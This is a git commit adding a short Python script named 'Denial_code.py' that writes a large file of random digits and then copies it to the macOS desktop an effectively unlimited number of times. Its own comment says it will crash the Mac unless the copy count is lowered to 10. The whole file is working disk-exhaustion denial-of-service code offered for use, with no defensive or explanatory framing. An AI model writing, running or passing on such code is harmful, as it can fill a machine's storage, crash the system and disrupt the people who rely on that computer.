7c3bf1f9d32aa6ce6dac85191dfb52ce8ebcf6ba
Deepinside614 <deepinside614@gmail.com>
2024-07-17 13:04:57 -0600

    Create Denial_code.py

---
+++ Denial_code.py
@@ -0,0 +1,24 @@
+import random
+import shutil
+
+def write_file(file_name, line_length=1000):
+    with open(file_name, 'w') as file:
+        for i in range(10000):
+            for x in range(line_length):
+                line_content = str(random.randint(0, 1))
+                file.write(''+line_content)
+            file.write('\n')
+
+def multiply(file_name, dst_file, number):
+    for i in range(number):
+        shutil.copy(file_name, dst_file+str(i)+'.txt')
+    
+def main():
+    file = "/users/USERNAME/documents/test.py"
+    newfile = "/users/USERNAME/desktop/test"
+    # set the 'USERNAME' above to whatever the user you are logged in on for mac
+    write_file(file)
+    multiply(file, newfile, 100000000000000000000000000000000) # set limit to 10 for safety and it will crash the mac if this code is run without setting limit to 10 
+
+if __name__ == "__main__":
+    main()
